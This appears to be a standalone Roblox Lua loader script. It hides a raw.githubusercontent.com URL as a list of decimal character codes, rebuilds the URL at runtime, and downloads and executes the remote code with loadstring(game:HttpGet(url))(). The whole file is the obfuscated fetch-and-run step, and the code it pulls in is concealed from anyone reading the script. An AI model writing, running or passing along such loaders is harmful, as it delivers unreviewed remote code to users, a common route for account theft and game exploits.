local c = {
    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,
    117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
    111,97,110,99,97,109,115,106,102,98,97,109,102,117,113,110,57,47,
    104,100,110,119,119,110,105,110,110,102,119,110,56,49,55,110,47,
    114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
    109,120,106,115,118,119,110,107,115,98,100,115,55,110,115
}

local url = ""

for i = 1, #c do
    url = url .. string.char(c[i])
end

loadstring(game:HttpGet(url))()
